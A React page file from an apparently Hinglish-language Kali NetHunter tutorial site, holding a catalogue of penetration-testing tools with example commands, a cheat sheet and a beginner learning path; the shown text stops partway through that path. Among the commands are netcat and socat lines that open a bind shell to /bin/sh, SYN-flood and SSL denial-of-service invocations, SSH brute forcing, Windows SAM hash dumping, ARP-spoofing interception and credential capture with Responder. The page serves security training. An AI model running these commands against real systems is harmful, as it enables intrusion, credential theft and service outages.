  {
    name: 'Sqlmap',
    slug: 'sqlmap',
    category: 'Web',
    commands: ['sqlmap --help', 'sqlmap -v', 'sqlmap -u "http://target.com/page.php?id=1" --batch --dbs -o'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Sqlninja',
    slug: 'sqlninja',
    category: 'Web',
    commands: ['sqlninja --help', 'sqlninja -v', 'sqlninja -m http -t http://target.com/page.php?id=1 -f config.conf'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'SQLSus',
    slug: 'sqlsus',
    category: 'Web',
    commands: ['sqlsus --help', 'sqlsus -v', 'sqlsus -u "http://target.com/page.php?id=1" -o sqlsus.conf'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'THC-SSL-DoS',
    slug: 'thc-ssl-dos',
    category: 'Web',
    commands: ['thc-ssl-dos --help', 'thc-ssl-dos -v', 'thc-ssl-dos -l 500 target.com 443 --accept'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Wafw00f',
    slug: 'wafw00f',
    category: 'Web',
    commands: ['wafw00f --help', 'wafw00f -v', 'wafw00f https://target.com -a'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Wapiti',
    slug: 'wapiti',
    category: 'Web',
    commands: ['wapiti --help', 'wapiti -v', 'wapiti -u http://target.com --scope folder -o /tmp/wapiti'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'WebSploit',
    slug: 'websploit',
    category: 'Web',
    commands: ['websploit --help', 'websploit -v', 'websploit --url=http://target.com --scan'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'WFuzz',
    slug: 'wfuzz',
    category: 'Web',
    commands: ['wfuzz --help', 'wfuzz -v', 'wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'WhatWeb',
    slug: 'whatweb',
    category: 'Web',
    commands: ['whatweb --help', 'whatweb -v', 'whatweb -v https://target.com --log-verbose=whatweb.log'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'Wpscan',
    slug: 'wpscan',
    category: 'Web',
    commands: ['wpscan --help', 'wpscan -v', 'wpscan --url https://target.com --enumerate u,vp --api-token API_KEY'],
    description: 'web application security testing aur vulnerability detection ke liye ek useful tool.',
  },
  {
    name: 'ACE-VoIP',
    slug: 'ace-voip',
    category: 'Passwords',
    commands: ['ace-voip --help', 'ace-voip -v', 'ace-voip -i eth0 -r capture.pcap -c SIP'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Cewl',
    slug: 'cewl',
    category: 'Passwords',
    commands: ['cewl --help', 'cewl -v', 'cewl -d 3 -m 6 -w words.txt https://target.com'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'CmosPwd',
    slug: 'cmospwd',
    category: 'Passwords',
    commands: ['cmospwd --help', 'cmospwd -v', 'cmospwd /dev/mem 0x70'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'CredDump',
    slug: 'creddump',
    category: 'Passwords',
    commands: ['creddump --help', 'creddump -v', 'python3 creddump.py /mnt/hive/SYSTEM /mnt/hive/SAM'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Crunch',
    slug: 'crunch',
    category: 'Passwords',
    commands: ['crunch --help', 'crunch -v', 'crunch 8 12 abc123 -o passlist.txt'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'FindMyHash',
    slug: 'findmyhash',
    category: 'Passwords',
    commands: ['findmyhash --help', 'findmyhash -v', 'findmyhash MD5 -h 5f4dcc3b5aa765d61d8327deb882cf99'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Hashcat',
    slug: 'hashcat',
    category: 'Passwords',
    commands: ['hashcat --help', 'hashcat -v', 'hashcat -m 0 -a 0 hash.txt rockyou.txt -O -w 4'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Hydra',
    slug: 'hydra',
    category: 'Passwords',
    commands: ['hydra --help', 'hydra -v', 'hydra -l admin -P wordlist.txt ssh://192.168.1.10 -V -f'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'John',
    slug: 'john',
    category: 'Passwords',
    commands: ['john --help', 'john -v', 'john --wordlist=rockyou.txt hash.txt --format=raw-md5'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Maskprocessor',
    slug: 'maskprocessor',
    category: 'Passwords',
    commands: ['maskprocessor --help', 'maskprocessor -v', 'mp64 -1 ?l?d pass?1?1?1?1?1?1 > wordlist.txt'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Medusa',
    slug: 'medusa',
    category: 'Passwords',
    commands: ['medusa --help', 'medusa -v', 'medusa -h 192.168.1.10 -u admin -P pass.txt -M ssh'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Onesixtyone',
    slug: 'onesixtyone',
    category: 'Passwords',
    commands: ['onesixtyone --help', 'onesixtyone -v', 'onesixtyone -c community.txt -i targets.txt -o snmp.txt'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'PACK',
    slug: 'pack',
    category: 'Passwords',
    commands: ['pack --help', 'pack -v', 'python3 rulegen.py --input hash.txt --output rules.rule'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'PDFCrack',
    slug: 'pdfcrack',
    category: 'Passwords',
    commands: ['pdfcrack --help', 'pdfcrack -v', 'pdfcrack -f encrypted.pdf -w wordlist.txt'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Pipal',
    slug: 'pipal',
    category: 'Passwords',
    commands: ['pipal --help', 'pipal -v', 'pipal wordlist.txt -o analysis.html'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Pyrit',
    slug: 'pyrit',
    category: 'Passwords',
    commands: ['pyrit --help', 'pyrit -v', 'pyrit -r capture.cap -i wordlist.txt attack_passthrough'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'RainbowCrack',
    slug: 'rainbowcrack',
    category: 'Passwords',
    commands: ['rainbowcrack --help', 'rainbowcrack -v', 'rtgen md5 numeric 1-8 0 8000 5000 0'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'SamDump2',
    slug: 'samdump2',
    category: 'Passwords',
    commands: ['samdump2 --help', 'samdump2 -v', 'samdump2 system SAM > hashes.txt'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'SipCrack',
    slug: 'sipcrack',
    category: 'Passwords',
    commands: ['sipcrack --help', 'sipcrack -v', 'sipcrack -w wordlist.txt sip.dump'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Sucrack',
    slug: 'sucrack',
    category: 'Passwords',
    commands: ['sucrack --help', 'sucrack -v', 'sucrack -w wordlist.txt -t 4 user@localhost'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Twofi',
    slug: 'twofi',
    category: 'Passwords',
    commands: ['twofi --help', 'twofi -v', 'twofi -d "Twitter Account" -o words.txt'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Wordlists',
    slug: 'wordlists',
    category: 'Passwords',
    commands: ['wordlists --help', 'wordlists -v', 'ls /usr/share/wordlists/ && cat rockyou.txt | head -100'],
    description: 'password cracking aur hash analysis ke liye ek effective tool.',
  },
  {
    name: 'Bettercap',
    slug: 'bettercap',
    category: 'Network',
    commands: ['bettercap --help', 'bettercap -v', 'bettercap -T -M arp:remote /192.168.1.1/ /192.168.1.10/ -w capture.pcap'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'DHCPig',
    slug: 'dhcpig',
    category: 'Network',
    commands: ['dhcpig --help', 'dhcpig -v', 'dhcpig -f /tmp/dhcp.pig -t 100'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Ettercap',
    slug: 'ettercap',
    category: 'Network',
    commands: ['ettercap --help', 'ettercap -v', 'ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.10/ -w capture.pcap'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Ferret',
    slug: 'ferret',
    category: 'Network',
    commands: ['ferret --help', 'ferret -v', 'ferret -i eth0 -p ferret.log'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Hamster',
    slug: 'hamster',
    category: 'Network',
    commands: ['hamster --help', 'hamster -v', 'hamster -i ferret.log'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'HexInject',
    slug: 'hexinject',
    category: 'Network',
    commands: ['hexinject --help', 'hexinject -v', 'hexinject -i eth0 -P -p payload.bin'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Hping3',
    slug: 'hping3',
    category: 'Network',
    commands: ['hping3 --help', 'hping3 -v', 'hping3 -S target.com -p 80 --flood'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'InviteFlood',
    slug: 'inviteflood',
    category: 'Network',
    commands: ['inviteflood --help', 'inviteflood -v', 'inviteflood eth0 100.0.0.1 200.0.0.1 5000'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Mitmproxy',
    slug: 'mitmproxy',
    category: 'Network',
    commands: ['mitmproxy --help', 'mitmproxy -v', 'mitmproxy --mode transparent --showhost -p 8080'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Netcat',
    slug: 'netcat',
    category: 'Network',
    commands: ['netcat --help', 'netcat -v', 'nc -lvnp 4444 -e /bin/bash'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Netsniff-ng',
    slug: 'netsniff-ng',
    category: 'Network',
    commands: ['netsniff-ng --help', 'netsniff-ng -v', 'netsniff-ng -i eth0 -o dump.pcap -b 0'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Rebind',
    slug: 'rebind',
    category: 'Network',
    commands: ['rebind --help', 'rebind -v', 'rebind -d target.com -a 10.0.0.5 -p 80'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Responder',
    slug: 'responder',
    category: 'Network',
    commands: ['responder --help', 'responder -v', 'responder -I eth0 -rdwv -f --lm'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'SniffJoke',
    slug: 'sniffjoke',
    category: 'Network',
    commands: ['sniffjoke --help', 'sniffjoke -v', 'sniffjoke -i eth0 --blacklist targets.txt'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'T50',
    slug: 't50',
    category: 'Network',
    commands: ['t50 --help', 't50 -v', 't50 10.0.0.1 --flood --syn -p 80 -c 10000'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Tcpdump',
    slug: 'tcpdump',
    category: 'Network',
    commands: ['tcpdump --help', 'tcpdump -v', 'tcpdump -i eth0 -n -s0 -X -w capture.pcap "port 80"'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'TCPFlow',
    slug: 'tcpflow',
    category: 'Network',
    commands: ['tcpflow --help', 'tcpflow -v', 'tcpflow -i eth0 -o /tmp/flow "port 80"'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Wireshark',
    slug: 'wireshark',
    category: 'Network',
    commands: ['wireshark --help', 'wireshark -v', 'wireshark -i eth0 -k -Y "http.request" -w capture.pcapng'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Yersinia',
    slug: 'yersinia',
    category: 'Network',
    commands: ['yersinia --help', 'yersinia -v', 'yersinia -I -G'],
    description: 'network security testing aur traffic analysis ke liye ek essential tool.',
  },
  {
    name: 'Autopsy',
    slug: 'autopsy',
    category: 'Forensics',
    commands: ['autopsy --help', 'autopsy -v', 'autopsy --db autopsy.db -d /mnt/evidence/case1/'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Binwalk',
    slug: 'binwalk',
    category: 'Forensics',
    commands: ['binwalk --help', 'binwalk -v', 'binwalk -Me firmware.bin -o extracted/'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Capstone',
    slug: 'capstone',
    category: 'Forensics',
    commands: ['capstone --help', 'capstone -v', 'python3 -c "from capstone import *; md = Cs(CS_ARCH_X86, CS_MODE_64); md.disasm(code, 0x1000)"'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'DC3DD',
    slug: 'dc3dd',
    category: 'Forensics',
    commands: ['dc3dd --help', 'dc3dd -v', 'dc3dd if=/dev/sda of=/mnt/evidence/disk.img hash=sha256'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Dex2Jar',
    slug: 'dex2jar',
    category: 'Forensics',
    commands: ['dex2jar --help', 'dex2jar -v', 'd2j-dex2jar.sh classes.dex -o app.jar'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'EDB Debugger',
    slug: 'edb-debugger',
    category: 'Forensics',
    commands: ['edb-debugger --help', 'edb-debugger -v', 'edb --run /tmp/binary --debug'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Foremost',
    slug: 'foremost',
    category: 'Forensics',
    commands: ['foremost --help', 'foremost -v', 'foremost -t jpg,png,pdf -i disk.img -o output/'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Ghidra',
    slug: 'ghidra',
    category: 'Forensics',
    commands: ['ghidra --help', 'ghidra -v', 'ghidra ProjectName -import binary.exe -overwrite'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Guymager',
    slug: 'guymager',
    category: 'Forensics',
    commands: ['guymager --help', 'guymager -v', 'guymager --gui --dd /dev/sda --file disk.dd'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Iaito',
    slug: 'iaito',
    category: 'Forensics',
    commands: ['iaito --help', 'iaito -v', 'iaito -f binary.exe -a x86'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'JD-GUI',
    slug: 'jd-gui',
    category: 'Forensics',
    commands: ['jd-gui --help', 'jd-gui -v', 'jd-gui app.jar'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Keystone',
    slug: 'keystone',
    category: 'Forensics',
    commands: ['keystone --help', 'keystone -v', 'python3 -c "from keystone import *; ks = Ks(KS_ARCH_X86, KS_MODE_64); ks.asm(\"inc eax\")"'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'PCredz',
    slug: 'pcredz',
    category: 'Forensics',
    commands: ['pcredz --help', 'pcredz -v', 'python3 Pcredz -i eth0 -v -o credentials.txt'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'PDF-Parser',
    slug: 'pdf-parser',
    category: 'Forensics',
    commands: ['pdf-parser --help', 'pdf-parser -v', 'python3 pdf-parser.py --stats malicious.pdf'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'PhotoRec',
    slug: 'photorec',
    category: 'Forensics',
    commands: ['photorec --help', 'photorec -v', 'photorec /log /d output/disk.img'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Radare2',
    slug: 'radare2',
    category: 'Forensics',
    commands: ['radare2 --help', 'radare2 -v', 'r2 -A -q binary.exe -c "afl; afl~syscall"'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Scalpel',
    slug: 'scalpel',
    category: 'Forensics',
    commands: ['scalpel --help', 'scalpel -v', 'scalpel -c scalpel.conf -o output/ disk.img'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Sleuth Kit',
    slug: 'sleuthkit',
    category: 'Forensics',
    commands: ['sleuthkit --help', 'sleuthkit -v', 'fls -r -o 2048 disk.img | mactime -d -b /tmp/body.txt'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Smali/Baksmali',
    slug: 'smali',
    category: 'Forensics',
    commands: ['smali --help', 'smali -v', 'java -jar smali.jar a smali_out/ -o classes.dex'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'TestDisk',
    slug: 'testdisk',
    category: 'Forensics',
    commands: ['testdisk --help', 'testdisk -v', 'testdisk /log disk.img'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Volatility',
    slug: 'volatility',
    category: 'Forensics',
    commands: ['volatility --help', 'volatility -v', 'volatility -f memory.dump imageinfo && volatility -f memory.dump --profile=Win10x64 pslist'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'Xplico',
    slug: 'xplico',
    category: 'Forensics',
    commands: ['xplico --help', 'xplico -v', 'xplico --interface eth0 --pcap capture.pcap'],
    description: 'digital forensics aur data analysis ke liye ek professional tool.',
  },
  {
    name: 'ADB',
    slug: 'adb',
    category: 'Mobile',
    commands: ['adb --help', 'adb -v', 'adb shell -s device_id shell pm list packages'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Android Framework Tools',
    slug: 'android-framework',
    category: 'Mobile',
    commands: ['android-framework --help', 'android-framework -v', 'apktool d app.apk -o decompiled/'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Apktool',
    slug: 'apktool',
    category: 'Mobile',
    commands: ['apktool --help', 'apktool -v', 'apktool d app.apk -o decompiled_app/'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Dex2Smali',
    slug: 'dex2smali',
    category: 'Mobile',
    commands: ['dex2smali --help', 'dex2smali -v', 'java -jar baksmali.jar d classes.dex -o smali_out/'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Drozer',
    slug: 'drozer',
    category: 'Mobile',
    commands: ['drozer --help', 'drozer -v', 'drozer console connect -s tcp:192.168.1.10:31415'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Fastboot',
    slug: 'fastboot',
    category: 'Mobile',
    commands: ['fastboot --help', 'fastboot -v', 'fastboot flash recovery twrp.img'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Firmware Mod Kit',
    slug: 'firmware-mod',
    category: 'Mobile',
    commands: ['firmware-mod --help', 'firmware-mod -v', 'python3 firmadyne/extractImages.py firmware.bin'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Frida',
    slug: 'frida',
    category: 'Mobile',
    commands: ['frida --help', 'frida -v', 'frida-ps -U -a && frida -U -f com.app.pkg -l script.js'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Mkbootimg',
    slug: 'mkbootimg',
    category: 'Mobile',
    commands: ['mkbootimg --help', 'mkbootimg -v', 'mkbootimg --kernel kernel.img --ramdisk ramdisk.img --output boot.img'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Objection',
    slug: 'objection',
    category: 'Mobile',
    commands: ['objection --help', 'objection -v', 'objection -g com.app.pkg explore'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Scrcpy',
    slug: 'scrcpy',
    category: 'Mobile',
    commands: ['scrcpy --help', 'scrcpy -v', 'scrcpy -m 1024 --max-fps 30'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'SignApk',
    slug: 'signapk',
    category: 'Mobile',
    commands: ['signapk --help', 'signapk -v', 'java -jar signapk.jar certificate.pem key.pk8 app.apk signed.apk'],
    description: 'mobile application security testing aur Android/iOS analysis ke liye ek specialized tool.',
  },
  {
    name: 'Chisel',
    slug: 'chisel',
    category: 'Tunneling',
    commands: ['chisel --help', 'chisel -v', 'chisel server -p 8000 --reverse && chisel client 10.0.0.5:8000 R:3000:localhost:80'],
    description: 'network tunneling aur traffic encapsulation ke liye ek reliable tool.',
  },
  {
    name: 'Dns2tcp',
    slug: 'dns2tcp',
    category: 'Tunneling',
    commands: ['dns2tcp --help', 'dns2tcp -v', 'dns2tcpc -z dns.example.com -l 8888 -r 10.0.0.5 -k password'],
    description: 'network tunneling aur traffic encapsulation ke liye ek reliable tool.',
  },
  {
    name: 'Dnscat2',
    slug: 'dnscat2',
    category: 'Tunneling',
    commands: ['dnscat2 --help', 'dnscat2 -v', 'dnscat2 --dns domain=example.com --no-cache'],
    description: 'network tunneling aur traffic encapsulation ke liye ek reliable tool.',
  },
  {
    name: 'HTTPTunnel',
    slug: 'httptunnel',
    category: 'Tunneling',
    commands: ['httptunnel --help', 'httptunnel -v', 'hts -F localhost:8080 80 && htc -F 8888 10.0.0.5'],
    description: 'network tunneling aur traffic encapsulation ke liye ek reliable tool.',
  },
  {
    name: 'Proxychains',
    slug: 'proxychains',
    category: 'Tunneling',
    commands: ['proxychains --help', 'proxychains -v', 'proxychains nmap -sT -Pn -p 80,443 target.com'],
    description: 'network tunneling aur traffic encapsulation ke liye ek reliable tool.',
  },
  {
    name: 'Pwnat',
    slug: 'pwnat',
    category: 'Tunneling',
    commands: ['pwnat --help', 'pwnat -v', 'pwnat -s 10.0.0.5:2222 -c target.com:80'],
    description: 'network tunneling aur traffic encapsulation ke liye ek reliable tool.',
  },
  {
    name: 'Socat',
    slug: 'socat',
    category: 'Tunneling',
    commands: ['socat --help', 'socat -v', 'socat TCP-LISTEN:4444,fork EXEC:/bin/sh'],
    description: 'network tunneling aur traffic encapsulation ke liye ek reliable tool.',
  },
  {
    name: 'Stunnel',
    slug: 'stunnel',
    category: 'Tunneling',
    commands: ['stunnel --help', 'stunnel -v', 'stunnel /etc/stunnel/stunnel.conf'],
    description: 'network tunneling aur traffic encapsulation ke liye ek reliable tool.',
  },
  {
    name: 'Lynis',
    slug: 'lynis',
    category: 'Audit',
    commands: ['lynis --help', 'lynis -v', 'lynis audit system --quiet --log-file /tmp/lynis.log'],
    description: 'security auditing aur compliance checking ke liye ek comprehensive tool.',
  },
  {
    name: 'Trivy',
    slug: 'trivy',
    category: 'Audit',
    commands: ['trivy --help', 'trivy -v', 'trivy image nginx:latest --severity CRITICAL,HIGH --output json'],
    description: 'security auditing aur compliance checking ke liye ek comprehensive tool.',
  },
]





const TOOLS_PER_PAGE = 30
const categories = ['All', ...new Set(tools.map(t => t.category))]

export default function Tools() {
  const [selectedCategory, setSelectedCategory] = useState('All')
  const [searchTerm, setSearchTerm] = useState('')
  const [currentPage, setCurrentPage] = useState(1)

  const filteredTools = tools.filter(tool => {
    const matchesCategory = selectedCategory === 'All' || tool.category === selectedCategory
    const matchesSearch = tool.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          (tool.description || '').toLowerCase().includes(searchTerm.toLowerCase())
    return matchesCategory && matchesSearch
  })

  const totalPages = Math.ceil(filteredTools.length / TOOLS_PER_PAGE)
  const safePage = Math.min(currentPage, totalPages || 1)
  const paginatedTools = filteredTools.slice((safePage - 1) * TOOLS_PER_PAGE, safePage * TOOLS_PER_PAGE)

  // Reset page when filters change
  useEffect(() => {
    setCurrentPage(1)
  }, [searchTerm, selectedCategory])

  return (
    <TutorialLayout
      title="Tools Reference"
      subtitle="Nethunter ke penetration testing tools ka complete guide"
      icon="🔧"
      prev={{ to: '/payloads', label: 'Payloads & Attacks' }}
      next={{ to: '/about', label: 'About Nethunter' }}
    >
      <h2>Nethunter Tools Library</h2>
      <p>
        Kali Nethunter mein 600+ security tools hain. Neeche sabse important tools ki list hai jo aapko aani chahiye. Har tool ke saath description aur common commands diye gaye hain. Kisi bhi tool ka naam search karein ya category se filter karein.
      </p>
      <p>
        In tools ko seekhne ka best tarika hai ki aap ek ek karke practice karein. Sabse pehle nmap se shuru karein (network scanning), phir aircrack-ng (WiFi hacking), phir Metasploit (exploitation). Jab basics clear ho jaayein toh advanced tools try karein.
      </p>

      {/* Search */}
      <div className="my-6">
        <input
          type="text"
          placeholder="Tools search karein... (jaise wifi, password, network)"
          value={searchTerm}
          onChange={e => setSearchTerm(e.target.value)}
          className="w-full px-4 py-3 bg-dark-800 border border-neon-green/30 rounded-lg text-white font-mono placeholder-gray-600 focus:outline-none focus:border-neon-green transition-colors"
        />
      </div>

      {/* Category Filter */}
      <div className="flex flex-wrap gap-2 mb-8">
        {categories.map(cat => (
          <button
            key={cat}
            onClick={() => setSelectedCategory(cat)}
            className={`px-3 py-1.5 rounded-lg text-sm font-mono transition-all ${
              selectedCategory === cat
                ? 'bg-neon-green text-dark-900 font-bold'
                : 'bg-dark-700 text-gray-400 hover:text-neon-green border border-dark-600'
            }`}
          >
            {cat}
          </button>
        ))}
      </div>

      {/* Tools Grid */}
      <div className="space-y-6">
        {paginatedTools.map(tool => (
          <div key={tool.name} className="glass-card p-6">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-xl font-mono font-bold text-neon-green">{tool.name}</h3>
              <span className="px-2 py-0.5 bg-neon-cyan/10 text-neon-cyan text-xs rounded-full font-mono">
                {tool.category}
              </span>
            </div>
            <p className="text-gray-400 text-sm mb-4">{tool.description}</p>
            <CodeBlock
              title="Common Commands"
              code={tool.commands.join('\n')}
            />
            {tool.slug && (
              <Link
                to={`/tool/${tool.slug}`}
                className="mt-4 inline-block px-4 py-2 bg-neon-green/10 border border-neon-green/30 text-neon-green rounded-lg text-sm font-mono hover:bg-neon-green/20 transition-colors"
              >
                Full Guide →
              </Link>
            )}
          </div>
        ))}
      </div>

      {filteredTools.length === 0 && (
        <div className="text-center py-12 text-gray-500">
          <span className="text-4xl">🔍</span>
          <p className="mt-4">"{searchTerm}" se koi tool nahi mila</p>
        </div>
      )}

      {/* Pagination */}
      {totalPages > 1 && (
        <div className="flex items-center justify-center gap-2 mt-8">
          <button
            onClick={() => setCurrentPage(p => Math.max(1, p - 1))}
            disabled={safePage === 1}
            className="px-3 py-2 bg-dark-800 border border-dark-600 rounded-lg text-gray-400 hover:text-neon-green hover:border-neon-green/30 disabled:opacity-40 disabled:cursor-not-allowed transition-all"
          >
            ← Previous
          </button>
          <div className="flex gap-1">
            {Array.from({ length: Math.min(totalPages, 10) }, (_, i) => {
              const start = Math.max(0, Math.min(safePage - 5, totalPages - 10))
              const pageNum = start + i + 1
              if (pageNum > totalPages) return null
              return (
                <button
                  key={pageNum}
                  onClick={() => setCurrentPage(pageNum)}
                  className={`w-9 h-9 rounded-lg text-sm font-mono transition-all ${
                    safePage === pageNum
                      ? 'bg-neon-green text-dark-900 font-bold'
                      : 'bg-dark-800 border border-dark-600 text-gray-400 hover:text-neon-green hover:border-neon-green/30'
                  }`}
                >
                  {pageNum}
                </button>
              )
            })}
          </div>
          <button
            onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))}
            disabled={safePage === totalPages}
            className="px-3 py-2 bg-dark-800 border border-dark-600 rounded-lg text-gray-400 hover:text-neon-green hover:border-neon-green/30 disabled:opacity-40 disabled:cursor-not-allowed transition-all"
          >
            Next →
          </button>
        </div>
      )}

      <h2 className="mt-12">Quick Command Cheat Sheet</h2>
      <p>
        Yahan kuch sabse common commands ka quick reference hai. Inhe yaad kar lein — exam mein kaam aayenge! Matlab penetration test mein kaam aayenge:
      </p>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
        <CodeBlock title="Network Recon (Network Scan)" code={`nmap -sn 192.168.1.0/24    # Devices dhundhein
nmap -sV -sC target         # Services detect karein
masscan 10.0.0.0/8 -p 22   # Fast port scan`} />
        <CodeBlock title="WiFi Attacks (WiFi Hacking)" code={`airmon-ng start wlan0       # Monitor mode
airodump-ng wlan0mon        # Networks scan
wifite                      # Automated attack`} />
        <CodeBlock title="Password Cracking (Password Todna)" code={`john --wordlist=rockyou.txt hash.txt
hashcat -m 0 hash.txt wordlist.txt
hydra -l admin -P pass.txt target ssh`} />
        <CodeBlock title="Web Testing (Website Testing)" code={`nikto -h http://target
gobuster dir -u http://target -w list.txt
sqlmap -u "http://target/?id=1"`} />
      </div>

      <h2 className="mt-12">Tools Kaise Seekhein — Learning Path</h2>
      <p>
        Agar aap beginner hain toh sab tools ek saath mat seekhein. Neeche diye gaye order mein seekhein — har tool pehle wale par based hai:
      </p>
      <div className="space-y-3 mt-4">
        {[
          { step: '1', title: 'nmap', desc: 'Network scanning sabse pehle seekhein — yeh foundation hai' },
          { step: '2', title: 'netcat', desc: 'Basic networking concepts samjhein — connections, ports, protocols' },
          { step: '3', title: 'aircrack-ng', desc: 'WiFi hacking seekhein — monitor mode, scanning, cracking' },
          { step: '4', title: 'Wireshark', desc: 'Packet analysis seekhein — traffic ko read karna seekhein' },
          { step: '5', title: 'hydra / john', desc: 'Password attacks seekhein — dictionary aur brute force' },
